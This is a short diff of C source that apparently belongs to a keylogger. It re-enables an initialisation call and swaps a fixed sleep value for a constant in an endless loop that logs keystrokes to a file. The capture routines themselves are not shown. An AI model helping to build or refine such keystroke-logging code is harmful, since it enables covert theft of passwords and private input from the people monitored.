@@ -48,7 +48,7 @@
 int main( int argc, char *argv[ ] )
 {	
 	// Initialize the state of the program
-	// initialize_program(  );
+	initialize_program(  );
 	
 	char * log_file_name;
 	
@@ -72,7 +72,7 @@ int main( int argc, char *argv[ ] )
 	log_infos( log_file, "# Keystrokes :\n" );
 	for( ; ; )
 	{
-		Sleep( 40 );
+		Sleep( TIME_TO_SLEEP );
 		log_keystrokes( log_file );
 	}
 
